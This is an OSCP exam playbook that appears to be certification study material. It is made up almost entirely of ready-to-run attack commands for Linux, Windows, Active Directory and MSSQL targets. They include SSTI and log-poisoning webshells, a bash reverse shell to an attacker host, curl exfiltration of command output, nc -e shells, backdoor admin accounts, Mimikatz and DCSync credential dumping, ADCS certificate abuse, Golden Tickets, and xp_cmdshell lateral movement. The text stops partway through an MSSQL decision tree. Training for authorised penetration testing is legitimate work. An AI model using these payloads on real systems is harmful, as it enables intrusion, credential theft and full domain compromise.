# OSCP Playbook
- https://anshu19981.github.io/OscpCheckList2026/

# OSCP+ Complete Exam Checklist & Attack Chains
ASSUMED BREACH — AD Set: Credentials are provided at exam start. You begin as a low-privilege domain user. Enumerate immediately with those creds.

** Table of Contents **

Exam Structure & Strategy

Universal Enumeration Framework

Standalone Linux Box Methodology

Standalone Windows Box Methodology

Active Directory Attack Chains

MSSQL — RCE & Lateral Movement

Pivoting & Tunneling

Password Attacks

File Transfer Cheatsheet

Shells & Upgrades

Exploit Development (BOF Reference)

Common CVEs & Exploits

Exam Day Tips

Proof Collection Checklist

Quick Reference Card

## Exam Structure & Strategy
AD Set Total: 40 pts

MS01 — local.txt: 10 pts
Entry point (provided creds)

MS02 — local.txt: 10 pts
Pivot via MS01

DC01 — proof.txt: 20 pts
Requires DA / SYSTEM

Each Standalone: 20 pts *3
local.txt=10 + proof.txt=10

Pass Threshold: 70
out of 100 pts

### Time Strategy (23h 45min)
Hour 0-0:30    Setup: VPN, loot dirs, /etc/hosts, nmap ALL targets in parallel

Hour 0:30-4    ATTACK AD SET FIRST — 40 pts guaranteed path

               ├── Enumerate with provided creds (BloodHound, CME, LDAP)
             
               ├── Low-hanging fruit: Kerberoast, AS-REP, descriptions, shares
           
               ├── Lateral MS01 → MS02 → DC
             
               └── Screenshot every proof immediately

Hour 4-8       Standalone Box 1 (pick easiest from nmap)

Hour 8-13      Standalone Box 2

Hour 13-18     Standalone Box 3

Hour 18-22     Revisit stuck machines with fresh eyes

Hour 22-23     Final screenshots, verify all proofs, report notes

### Metasploit Rule

✓ msfvenom      → use freely on ALL machines (payload gen only)

✓ Metasploit    → EXACTLY 1 machine — choose wisely

✗ Metasploit    → CANNOT use on more than 1 machine

✓ Manual exploits → unlimited

## Universal Enumeration Framework

### Initial Recon — Run in Parallel

#### Setup workspace
mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}

#### Parallel quick scans on ALL targets:
for ip in <MS01_IP> <MS02_IP> <DC_IP> <BOX1_IP> <BOX2_IP> <BOX3_IP>; do
    nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &
done; wait

#### Full TCP per machine:
nmap -p- -sV -sC --open -T4 <TARGET_IP> -oN full_tcp.txt

#### UDP top 20 — DON'T SKIP (SNMP/TFTP/DNS often critical):
nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt

## Port → Action Decision Table

Port	Service	Immediate Action

21	FTP	ftp <IP> (try anonymous:anonymous); check version → searchsploit

22	SSH	Note version; use creds found later; id_rsa files?

25	SMTP	smtp-user-enum; check open relay

53	DNS	dig axfr @<IP> <domain>; dnsrecon zone transfer

80/443	HTTP/S	→ Full web enumeration workflow below

88	Kerberos	AD confirmed! AS-REP roast immediately

111	RPC/NFS	showmount -e <IP>; mount + explore

139/445	SMB	→ SMB enumeration section below

161 UDP	SNMP	snmpwalk -c public -v1; onesixtyone brute

389/636	LDAP	ldapsearch anonymous; AD enumeration

1433	MSSQL	→ Full MSSQL section (Section 6)

3306	MySQL	mysql -u root -h <IP> (blank/default pass)

3389	RDP	Check ms17-010, BlueKeep; use creds

5985	WinRM	evil-winrm -i <IP> -u user -p pass

8080/8443	Alt-HTTP	Tomcat? Jenkins? Weblogic? check /manager

## Web Enumeration Workflow

### 1. Tech fingerprint
whatweb http://<TARGET_IP> -v
curl -I http://<TARGET_IP>
nikto -h http://<TARGET_IP> -output nikto.txt &

### 2. Directory brute force
gobuster dir -u http://<TARGET_IP> \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -x php,html,txt,asp,aspx,jsp -t 50 -o gobuster.txt

feroxbuster -u http://<TARGET_IP> \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt

### 3. Always manually check:
curl http://<TARGET_IP>/robots.txt
curl http://<TARGET_IP>/.git/HEAD
curl http://<TARGET_IP>/.env
curl http://<TARGET_IP>/backup/
curl http://<TARGET_IP>/config.php
view-source:http://<TARGET_IP>/           # HTML comments!

### 4. VHost enumeration:
gobuster vhost -u http://<DOMAIN> \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain -t 50 -o vhosts.txt

### 5. CMS-specific:
wpscan --url http://<TARGET_IP> --enumerate u,p,t,cb,dbe --plugins-detection aggressive
joomscan -u http://<TARGET_IP>

### 6. Parameter fuzzing:
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -u "http://<TARGET_IP>/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500


## SMB Enumeration

### Unauthenticated:
smbclient -L //<TARGET_IP> -N
smbmap -H <TARGET_IP> -u '' -p ''
crackmapexec smb <TARGET_IP> -u '' -p '' --shares
nmap --script smb-vuln* -p 445 <TARGET_IP>

### Authenticated:
crackmapexec smb <TARGET_IP> -u user -p pass --shares --users --groups --pass-pol
smbmap -H <TARGET_IP> -u user -p pass -R
smbclient //<TARGET_IP>/share -U 'user%pass'

### Download all files recursively:
smbclient //<TARGET_IP>/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
SNMP Enumeration
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.4.1.77.1.2.25    # Windows users
snmp-check <TARGET_IP> -c public


## Standalone Linux Box Methodology

Linux Web Attack Techniques
LFI / Local File Inclusion

### Basic traversal:
/page.php?file=../../../../etc/passwd
/page.php?file=../../../../etc/shadow
/page.php?file=/proc/self/environ

### PHP wrappers:
/page.php?file=php://filter/convert.base64-encode/resource=config.php

### Decode: echo '<BASE64>' | base64 -d

### Log Poisoning → RCE:

#### Step 1: Inject PHP into Apache log via User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/

#### Step 2: Include log file:
/page.php?file=/var/log/apache2/access.log&cmd=id

### SSH log poisoning:
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
/page.php?file=/var/log/auth.log&cmd=whoami

## SQL Injection

Manual test: ' OR '1'='1'-- -
UNION read:
' UNION SELECT 1,load_file('/etc/passwd'),3-- -

### File write:
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/cmd.php'-- -

## sqlmap: 

sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=x" --level=5 --risk=3 --dbs

sqlmap -u "http://<IP>/item?id=1" --os-shell

## SSTI — Server-Side Template Injection

### Detection probes:
{{7*7}}       → 49 = Jinja2/Twig
${7*7}        → 49 = FreeMarker/Mako
<%= 7*7 %>   → 49 = ERB (Ruby)

### Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"').read()}}

### Twig RCE:
{{['id']|filter('system')}}

## RFI — Remote File Inclusion

### Requires: allow_url_include=On in php.ini
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80
/page.php?file=http://<LHOST>/shell.txt&cmd=id
Blind SQLi — Time-Based

### Detection (3s delay = vulnerable):
http://target/page.php?id=1' AND IF(1=1,sleep(3),'false')-- -
sqlmap -u "http://<IP>/page.php?id=1" --technique=T --level=3 --dbs

## .git Exposed → Credential Chain
curl http://<TARGET>/.git/HEAD       ### confirm exposed
git-dumper http://<TARGET>/.git ./repo
cd repo
git log --oneline
git show <COMMIT_HASH>              ### deleted creds often here
git diff HEAD~1 HEAD
Exiftool — Metadata → Usernames
exiftool *.jpg *.docx *.pdf 2>/dev/null | grep -i "author\|creator\|owner"

### Username found? Try as password on ALL services!
Archive / ZIP Cracking
zip2john protected.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
office2john file.xlsx > office.hash
john office.hash --wordlist=rockyou.txt
binwalk -e suspicious_file    # extract embedded files
MySQL UDF RCE (root creds + FILE priv)

### Check:
SELECT user, file_priv FROM mysql.user;

SHOW variables LIKE 'plugin_dir';

### Compile malicious UDF .so → upload → CREATE FUNCTION → system()

### If MySQL local-only → SSH tunnel first:

ssh -L 3306:127.0.0.1:3306 user@<TARGET_IP>

mysql -u root -h 127.0.0.1 -P 3306 -p

## Command Injection

### Test chars: ; | || && & ` $() \n %0a
ping=127.0.0.1; whoami
ping=127.0.0.1|whoami
ping=127.0.0.1`whoami`

### URL encoded semicolon: %3B

### Blind (OOB):
ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)

## File Upload Bypass

### 1. MIME: Change Content-Type to image/jpeg

### 2. Magic bytes: GIF89a prepend

### 3. Double ext: shell.php.jpg, shell.php%00.jpg

### 4. Case: shell.pHp, shell.PHP

### 5. Alt ext: .php3 .php4 .php5 .phtml .phar .shtml

### 6. Null byte (older): shell.php%00.gif

## Chained Attack Patterns — Standalone (Real OSCP Scenarios)
Key Insight: OSCP boxes rarely have a single vulnerability. They chain 2-3 misconfigs. These are the most common patterns found in real exam/PG boxes.

### Chain A — Web Version CVE → Cred → Privesc
Apache/Nginx/App version found → searchsploit → RCE as www-data
→ config.php has DB creds → reuse creds for SSH → sudo -l → ROOT

### Chain B — Anonymous SMB → Creds → RCE
SMB null session → readable share → config/pdf/xlsx file
→ creds found → SSH/WinRM login → SUID/SeImpersonate → ROOT

### Chain C — LFI → SSH Key Read → Shell → Privesc
LFI at ?file= param → /home/user/.ssh/id_rsa → chmod 600 → SSH in
→ sudo -l NOPASSWD → GTFObins → ROOT

### Chain D — Web Login → File Upload → Webshell → Cron Root
Default creds (admin:admin) → file upload → bypass (phar/phtml)
→ webshell as www-data → /etc/crontab writable script → ROOT

### Chain E — LFI + PHP Filter → DB Creds → SQLi File Write → RCE
LFI + php://filter → base64 decode config.php → DB creds
→ SQLi UNION INTO OUTFILE → webshell → shell → privesc

### Chain F — .git Exposed → Deleted Creds → SSH → sudo
/.git/HEAD accessible → git-dumper → git log/diff
→ password found in old commit → SSH login → sudo privesc → ROOT

### Chain G — FTP Anon Write + Webroot Overlap → Shell
FTP anonymous login → writable dir = /var/www/html/uploads
→ upload PHP shell → trigger via browser → www-data
→ capabilities/cron → ROOT

### Chain H — SNMP Community → Username → Password Spray → RCE
snmpwalk → running process with username / installed software version
→ username found → spray common passwords → SSH/WinRM
→ SeImpersonate or SUID → ROOT

### Chain I — Username as Password (Very Common in OSCP)
Any service leaks username (SMTP enum, SNMP, web, SMB)
→ try username:username, username:username123, username:Company1
→ login → privesc

### Chain J — SQLi → OS Shell (MSSQL/MySQL)
SQLi on login form → xp_cmdshell (MSSQL) or UDF (MySQL)
→ RCE as service account → SeImpersonate → SYSTEM

## Linux Privilege Escalation Checklist

### STEP 1: Run linpeas immediately
curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out

### Look for RED/YELLOW highlights first

### ── Context ──────────────────────────────────────────────────
whoami && id && hostname
uname -a && cat /etc/os-release
env | grep -i "pass\|key\|secret\|token"
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null

### ── Sudo ─────────────────────────────────────────────────────
sudo -l
# NOPASSWD → check GTFObins immediately!
# Common: sudo find . -exec /bin/bash \; -p
#         sudo python3 -c 'import os; os.system("/bin/bash")'
#         sudo vim → :!/bin/bash

### ── SUID ─────────────────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
### Each result → GTFObins

### ── Capabilities ─────────────────────────────────────────────
getcap -r / 2>/dev/null
### cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

### ── Cron Jobs ────────────────────────────────────────────────
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
### Writable script run as root → append revshell
### Wildcard (tar/rsync) → wildcard injection

### ── Writable /etc/passwd ─────────────────────────────────────
openssl passwd -1 haxpass
echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax

### ── NFS no_root_squash ───────────────────────────────────────
cat /etc/exports
### If: /share *(rw,no_root_squash) →
### On ATTACKER (as root):
mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash
### On VICTIM:
/tmp/bash -p    # → ROOT

### ── Docker group ─────────────────────────────────────────────
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

### ── Internal services ────────────────────────────────────────
ss -tlnp   # local-only → port forward → exploit
Linux PrivEsc Decision Tree
sudo -l → NOPASSWD?
    └── GTFObins → ROOT ✓

SUID binary?
    ├── Known binary (GTFObins) → ROOT ✓
    └── Custom → strings/ltrace → PATH hijack → ROOT ✓

Capabilities?
    └── cap_setuid → setuid(0) → ROOT ✓

Cron writable script?
    └── Append reverse shell → ROOT ✓

/etc/passwd writable?
    └── Add root user → ROOT ✓

NFS no_root_squash?
    └── Mount + SUID bash → ROOT ✓

Docker group?
    └── docker run -v /:/mnt → chroot → ROOT ✓

Nothing? → Kernel exploit (check exact version)


## Standalone Windows Box Methodology
Windows Initial Access
### EternalBlue MS17-010:
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

### Tomcat Manager WAR deploy:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
curl -u admin:admin -T shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
curl http://<IP>:8080/shell/

### WebDAV:
davtest -url http://<TARGET_IP>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx

### WinRM:
evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
Windows Privilege Escalation
Token Privileges (whoami /priv)
Privilege	Exploit Path
SeImpersonatePrivilege	GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM
SeAssignPrimaryToken	GodPotato / JuicyPotato → SYSTEM
SeBackupPrivilege	Read SAM/NTDS → dump hashes
SeDebugPrivilege	Dump LSASS → hashes
SeLoadDriverPrivilege	Load malicious driver → SYSTEM
# GodPotato (SeImpersonate):
.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"

### PrintSpoofer:
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"

### AlwaysInstallElevated (check BOTH keys = 1):
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi

### Autologon creds in registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

### PowerShell history (GOLD MINE):
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

### Stored credentials:
cmdkey /list
runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"

### Unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

## Dump Credentials (Windows Post-Exploitation)
### Mimikatz:
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch

### Remote SAM dump:
secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
netexec smb <TARGET_IP> -u user -p pass --sam
netexec smb <TARGET_IP> -u user -p pass -M lsassy

==============================================================================

# Active Directory Attack Chains

OSCP AD SET IS ASSUMED BREACH. You receive valid domain credentials at exam start (e.g. stephanie: Password123@corp.local). You are already a low-priv domain user. Enumerate AD immediately.

AD Full Attack Flow
PROVIDED CREDS (stephanie:Password123)
        │
        ▼
Phase 1: RAPID AD ENUMERATION
    BloodHound + CME + LDAP + PowerView
        │
        ▼
Phase 2: QUICK WINS (all simultaneously)
    ├── AS-REP Roasting
    ├── Kerberoasting
    ├── Passwords in descriptions (VERY COMMON)
    ├── SMB share hunting
    └── GPP/SYSVOL passwords
        │
        ▼
Phase 3: FOOTHOLD on MS01  (local.txt = 10 pts)
        │
        ▼
Phase 4: PIVOT to MS02  (local.txt = 10 pts)
    Setup Ligolo-ng tunnel → lateral move
        │
        ▼
Phase 5: ESCALATE to Domain Admin
    ACL abuse / DCSync / Delegation / GPO
        │
        ▼
Phase 6: OWN DC  (proof.txt = 20 pts)
    PSExec/WMIexec as DA → dump NTDS → Golden Ticket

## Phase 1: AD Enumeration

### BloodHound — FIRST THING TO RUN:
bloodhound-python -u stephanie -p 'Password123' \
    -d corp.local -ns 192.168.x.100 -c All --zip
### Import ZIP → run queries:
###   "Find Shortest Paths to Domain Admins"
###   "Find All Kerberoastable Users"
###   "Find AS-REP Roastable Users"
###   "Computers with Unconstrained Delegation"
###   "Find Principals with DCSync Rights"

### CME domain recon:
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' \
    --shares --users --groups --pass-pol

### Passwords in description field (VERY COMMON in OSCP):
ldapsearch -x -H ldap://192.168.x.100 \
    -D "stephanie@corp.local" -w 'Password123' \
    -b "DC=corp,DC=local" \
    "(&(objectClass=user)(description=*))" sAMAccountName description

### AS-REP Roasting
GetNPUsers.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt

### Windows (Rubeus):
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

### Crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt


## Kerberoasting
GetUserSPNs.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -outputfile kerb.txt

### Windows (Rubeus):
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

### Crack:
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

## GPP / SYSVOL
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
gpp-decrypt <CPASSWORD_VALUE>

## ADCS — Active Directory Certificate Services

### CRITICAL GAP: ADCS attacks (ESC1-ESC8) are now common in OSCP AD sets. Any domain user can escalate to Domain Admin if misconfigured. Always enumerate ADCS with the provided creds.

### Enumerate vulnerable templates (run immediately with provided creds):
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -vulnerable -stdout

### Also save BloodHound data:
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -bloodhound

## ── ESC1 — User can specify SAN (most common) ─────────────────
* Conditions: Enrollee Supplies Subject=True + Client Auth + low-priv enrollment
certipy req -u 'stephanie@corp.local' -p 'Password123' \
    -ca corp-CA -template VulnerableTemplate \
    -upn Administrator@corp.local -dc-ip 192.168.x.100
  
### Authenticate with cert → get NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100

### → Administrator NTLM hash → PTH → Domain Admin!

## ── ESC8 — NTLM Relay to ADCS HTTP endpoint ──────────────────
### Setup certipy relay:
certipy relay -target http://<ADCS_IP>/certsrv/certfnsh.asp \
    -template DomainController
### Trigger DC authentication (PetitPotam):
python3 PetitPotam.py -u stephanie -p 'Password123' \
    <LHOST> <DC_IP>
    
### Gets: DC machine certificate → authenticate as DC → DCSync everything

## ── ESC4 — Write access to template ──────────────────────────
### BloodHound shows WriteProperty on certificate template
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -save-old   # backup original
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -configuration VulnTemplate.json
    
* Now request as ESC1

## ── After getting cert → auth → hash → DA ────────────────────
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100

### Hash from output → PTH:
psexec.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
secretsdump.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
Shadow Credentials Attack

### Requires: GenericWrite on target user/computer
### Check in BloodHound: GenericWrite edges on users or computers

### Add shadow credential to target:
pywhisker.py -d corp.local -u stephanie -p 'Password123' \
    --target targetuser --action add --dc-ip 192.168.x.100
### Gets: pfx file + password

### Authenticate with pfx → get NTLM hash:
certipy auth -pfx targetuser.pfx -dc-ip 192.168.x.100
### NTLM hash → PTH or crack → lateral movement
AS-REP Roast — Unauthenticated (No Creds Needed)
### Enumerate users first via RID brute (no creds):
lookupsid.py corp.local/guest@192.168.x.100 -no-pass 2>/dev/null | grep "SidTypeUser"
### Or kerbrute:
kerbrute userenum -d corp.local --dc 192.168.x.100 \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

### Then AS-REP roast without creds:
GetNPUsers.py corp.local/ -no-pass -usersfile domain_users.txt \
    -dc-ip 192.168.x.100 -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt

## LDAP — Extended Field Enumeration
### Check description AND info AND comment fields (all can have passwords):
ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description info comment

### Also check computer accounts for descriptions:
ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=computer)" name description


## MS01 → MS02 — When PTH Fails (Fallback Chain)
PTH to MS02 failed?
        │
        ▼
Try in this order:

1. Kerberoast from MS01 context → crack → try new creds on MS02

2. MSSQL on MS01 linked to MS02 → xp_cmdshell on MS02 (Section 6)

3. PS history on MS01 → C:\Users\*\AppData\...\ConsoleHost_history.txt

4. web.config/app.config on MS01 → DB creds → reuse on MS02

5. BloodHound: MS01 machine account GenericAll on MS02?

6. Unconstrained delegation on MS01 → coerce DC → TGT → DCSync

7. ADCS ESC1/ESC8 → cert as MS02 admin → authenticate

8. Password spray with ALL found creds/hashes on MS02 services


## Credential Spray — Across All Services (Chain)

Rule: Every credential found anywhere must be tried on every service everywhere. Password reuse wins OSCP.

### Any creds found → spray everything:

netexec smb 192.168.x.0/24 -u user -p pass --continue-on-success

netexec winrm 192.168.x.0/24 -u user -p pass --continue-on-success

netexec mssql 192.168.x.0/24 -u user -p pass --continue-on-success

netexec rdp 192.168.x.0/24 -u user -p pass --continue-on-success

netexec ssh 192.168.x.0/24 -u user -p pass --continue-on-success

### After getting any hash → spray hash across subnet:

netexec smb 192.168.x.0/24 -u Administrator -H <NTLM_HASH> --local-auth --continue-on-success | grep "+"


## ADCS + AD Attack Decision Tree

Run certipy find immediately with the provided creds
        │
    ┌───┴──────────────────────┐
Vulnerable template found?    No ADCS vuln
    │                              │
    ▼                         Continue normal AD path
ESC1 → certipy req -upn Administrator
    │
    ▼
certipy auth → NTLM hash
    │
    ▼
PTH as Administrator → Domain Admin ✓

## ESC8 (HTTP endpoint)?

→ certipy relay + PetitPotam coerce

→ DC cert → DCSync → ALL hashes → Golden Ticket

## Pass-the-Ticket

### Windows (Rubeus):

.\Rubeus.exe triage

.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap

.\Rubeus.exe ptt /ticket:<BASE64_TICKET> dir \\<TARGET_FQDN>\C$

## Linux:

export KRB5CCNAME=/tmp/ticket.ccache

psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>

## Overpass-the-Hash

### NTLM hash → Kerberos TGT:
.\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt

## Linux:
getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100 export KRB5CCNAME=user.ccache

psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>

Lateral Movement — Pass-the-Hash

### Verify hash:
crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth

### Spray hash across subnet:
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> --local-auth --continue-on-success | grep "+"

### Get shell:

psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>

wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>

evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>

### DCSync Attack

secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc

secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt

secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator

### Mimikatz:

lsadump::dcsync /user:krbtgt /domain:corp.local

lsadump::dcsync /all /domain:corp.local

ACL Abuse — Common BloodHound Paths

### GenericAll on User → force password reset:
Set-DomainUserPassword -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

### GenericAll on Group → add to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie

### WriteDACL on Domain → grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity Stephanie -Rights DCSync
### → now run secretsdump

### GenericAll on Computer → RBCD Attack:
addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
    'corp.local/stephanie: Password123' -dc-ip 192.168.x.100
rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>


## Golden Ticket

### Requirements: krbtgt NTLM hash + Domain SID

ticketer.py -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>

================================================================================

# MSSQL — RCE & Lateral Movement

MSSQL is a major OSCP attack path: initial RCE via xp_cmdshell, lateral movement via linked servers, hash capture via UNC injection, privesc via impersonation.

## Step 1: Connect
`` mssqlclient.py corp.local/sa@<TARGET_IP> -windows-auth
mssqlclient.py sa@<TARGET_IP>
mssqlclient.py corp.local/user:'pass'@<TARGET_IP> -windows-auth
``
## Step 2: Enumerate
``SELECT @@version;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = sysadmin!
SELECT name FROM master.dbo.sysdatabases; ``

-- Check impersonation rights:
`` SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'; ``

-- Linked servers:
``EXEC sp_linkedservers;
SELECT srvname, isremote FROM master..sysservers;
``
## Step 3: Enable xp_cmdshell → RCE

``EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ``

``EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';
EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add'; ``


## Step 4: Impersonation (non-sysadmin → sysadmin)
``
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
``

## Step 5: Linked Server Lateral Movement

``
-- Single hop (MS01 → MS02):
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT @@version, SYSTEM_USER');
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
``
``
-- Execute on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
``
``
-- Enable + RCE on linked server:
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
EXEC ('xp_cmdshell ''powershell -enc <BASE64>''') AT [MS02\SQLEXPRESS];
``
``
-- Double hop (MS01 → MS02 → MS03):
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
``

## Step 6: UNC Path Injection → Hash Capture
``
### Setup Responder:
sudo responder -I tun0 -v

### In MSSQL — trigger UNC auth:
EXEC xp_dirtree '\\<LHOST>\share';
EXEC xp_fileexist '\\<LHOST>\share\file';

### Crack captured NetNTLMv2:
hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt

### NTLM Relay (if SMB signing off):
sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
MSSQL Attack Decision Tree
MSSQL Found (port 1433)
        │
Try creds: sa:(blank) / sa:sa / sa:password / domain_user:known_pass
        │
    ┌───┴──────────┐
 Sysadmin?      Not sysadmin?
    │               │
    │         Check IMPERSONATE rights
    │         → EXECUTE AS LOGIN='sa'
    │               │
    └───────────────┘
        │
Enable xp_cmdshell → RCE on current server
        │
Check linked servers (sp_linkedservers)
        │
    ┌───┴─────────────────────────────┐
No links                       Links found
    │                                │
